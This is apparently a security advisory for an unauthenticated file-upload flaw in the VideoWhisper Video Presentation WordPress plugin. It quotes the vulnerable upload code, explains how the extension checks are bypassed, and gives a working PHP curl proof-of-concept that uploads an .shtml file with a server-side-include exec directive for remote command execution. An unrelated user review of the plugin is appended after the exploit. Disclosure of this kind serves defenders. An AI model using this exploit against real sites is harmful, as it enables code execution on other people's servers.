Description: from the site
"VideoWhisper Video Consultation is a web based video communication solution designed for online video consultations, interactive live presentations, trainings, webinars, coaching and online collaboration with webcam support. Read more on WordPress Video Presentation plugin home page."

Vulnerability:
From wp-content/plugins/videowhisper-video-presentation/vp/vw_upload.php Allows various remote unauthenticated file uploads, among the file types is html where the last 4 characters are only being checked in a file name to match which types are allowed. Because of this .shtml can be passed through and remote code execution if SSI is allowed. The code does not do any user access validation and therefore anyone can upload the following files to an unsuspecting wordpress site: .shtml,swf,.zip,.rar,.jpg,jpeg,.png,.gif,.txt,.doc,docx,.htm,html,.pdf,.mp3,.flv,.avi,.mpg,.ppt,.pps
The
if (strstr($filename,'.php')) exit;

can be by passed by using the extension .Php but the file extension check would allow files like test.Php.shtml
<?php
if ($_GET["room"]) $room=$_GET["room"];
if ($_POST["room"]) $room=$_POST["room"];
$filename=$_FILES['vw_file']['name'];
include_once("incsan.php");
sanV($room);
if (!$room) exit;
sanV($filename);
if (!$filename) exit;
if (strstr($filename,'.php')) exit; //do not allow uploads to other folders
if ( strstr($room,"/") || strstr($room,"..") ) exit;
if ( strstr($filename,"/") || strstr($filename,"..") ) exit;
$destination="uploads/".$room."/“;
if ($_GET["slides"]) $destination .= "slides/“;
$ext=strtolower(substr($filename,-4)); $allowed=array(".swf",".zip",".rar",".jpg","jpeg",".png",".gif",".txt",".doc","docx",".htm","html",".pdf",".mp3",".flv",".avi",".mpg",".ppt",".pps”);
if (in_array($ext,$allowed)) move_uploaded_file($_FILES['vw_file']['tmp_name'], $destination . $filename);
?>loadstatus=1
CVEID: TBD
OSVDB: TBD
Exploit Code:
	videowhis_poc.php
       <?php

	 $uploadfile="upexp.shtml";
	 $ch =
	 curl_init("<http://target>_site/wp-content/plugins/videowhisper-video-presentation/vp/vw_upload.php");
	 curl_setopt($ch, CURLOPT_POST, true);
	 curl_setopt($ch, CURLOPT_POSTFIELDS,
	          array('vw_file'=>"@$uploadfile",'name'=>'upexp.shtml','room'=>'.'));
	 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	 $postResult = curl_exec($ch);
	 curl_close($ch);
	 print "$postResult";

	 ?>

	 upexp.shtml

	 <html>

	 <!--#exec cmd="/usr/bin/date > /tmp/p" -->

	 this is html
	 </html>

	 The executeable should be located in wordpress/wp-content/plugins/videowhisper-video-conference-integration/vc/uploads

### [Very good live presentation](https://wordpress.org/support/topic/very-good-live-presentation/)

[popeating](https://profiles.wordpress.org/popeating/ "Posts by popeating")
April 6, 2017

Really good plugin for one to many live presentation
very easy to install, it also setup the needed pages to manage rooms and start broadcasting.
It ships with a lot of options for user limitation (who can create and access rooms for example)
it uses flexible shortcodes to embed presentation in the site.
Please remeber that you need an RTMP server to stream your videos, anyway they offer guides on how to install it
I would have preferred some different payment gateway for monetizing my presentation (Paypal and Stripe for examle), but it only offers myCRED to sell access to rooms
